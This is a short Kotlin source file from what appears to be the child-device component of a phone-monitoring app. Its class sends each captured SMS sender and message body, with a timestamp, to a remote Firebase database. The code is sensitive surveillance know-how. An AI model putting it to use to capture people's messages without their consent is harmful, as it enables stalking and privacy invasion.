package com.github.midros.child.services.sms

import android.content.Context
import com.github.midros.child.data.rxFirebase.InterfaceFirebase
import com.github.midros.child.data.model.Sms
import com.github.midros.child.services.base.BaseInteractorService
import com.github.midros.child.utils.ConstFun.getDateTime
import com.github.midros.child.utils.Consts.DATA
import com.github.midros.child.utils.Consts.SMS
import javax.inject.Inject

/**
 * Created by luis rafael on 27/03/18.
 */
class InteractorSms<S : InterfaceServiceSms> @Inject constructor(context: Context, firebase: InterfaceFirebase) : BaseInteractorService<S>(context, firebase), InterfaceInteractorSms<S> {

    override fun setPushSms(smsAddress: String, smsBody: String) {
        val sms = Sms(smsAddress, smsBody, getDateTime())
        firebase().getDatabaseReference("$SMS/$DATA").push().setValue(sms)
        if (getService() != null) getService()!!.stopServiceSms()
    }

}